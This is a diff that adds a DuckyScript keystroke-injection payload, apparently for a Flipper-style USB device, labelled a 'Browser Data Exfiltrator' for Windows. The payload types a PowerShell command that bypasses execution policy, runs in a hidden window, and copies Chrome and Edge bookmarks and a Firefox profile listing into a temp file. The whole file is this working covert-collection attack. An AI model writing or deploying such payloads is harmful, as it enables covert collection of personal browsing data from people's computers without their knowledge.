@@ -1,0 +1,14 @@
+REM ==============================================
+REM CYBERFLIPPER — Browser Data Exfiltrator
+REM Exports browser bookmarks and history
+REM Inspired by WiFi Pineapple payloads
+REM ==============================================
+REM TARGET: Windows 10/11
+REM AUTHOR: @CYBERFLIPPER / FLLC
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"$out = $env:TEMP + \\\"\browser_audit.txt\\\"; \\\"=== CYBERFLIPPER BROWSER AUDIT ===\\\" | Out-File $out; \\\"Date: $(Get-Date)\\\" >> $out; \\\"\\\" >> $out; $chrome_bm = \\\"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks\\\"; if(Test-Path $chrome_bm) { \\\"=== CHROME BOOKMARKS ===\\\" >> $out; Get-Content $chrome_bm >> $out }; $edge_bm = \\\"$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Bookmarks\\\"; if(Test-Path $edge_bm) { \\\"=== EDGE BOOKMARKS ===\\\" >> $out; Get-Content $edge_bm >> $out }; $firefox_profiles = \\\"$env:APPDATA\Mozilla\Firefox\Profiles\\\"; if(Test-Path $firefox_profiles) { \\\"=== FIREFOX PROFILES ===\\\" >> $out; Get-ChildItem $firefox_profiles | Out-String >> $out }; Write-Host \\\"Browser audit saved to $out\\\"\"' -WindowStyle Hidden"
+ENTER
+DELAY 5000
